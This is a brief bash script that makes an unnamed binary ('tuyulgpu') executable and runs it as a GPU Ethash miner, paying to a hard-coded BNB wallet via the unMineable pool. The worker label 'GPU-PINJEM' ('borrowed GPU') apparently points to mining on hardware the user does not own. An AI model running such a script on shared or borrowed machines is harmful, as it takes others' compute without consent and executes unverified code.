#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=BNB:bnb10vumkukp65486dwr4af4m0qp026dffnljd3v6r
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)

chmod +x tuyulgpu
./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
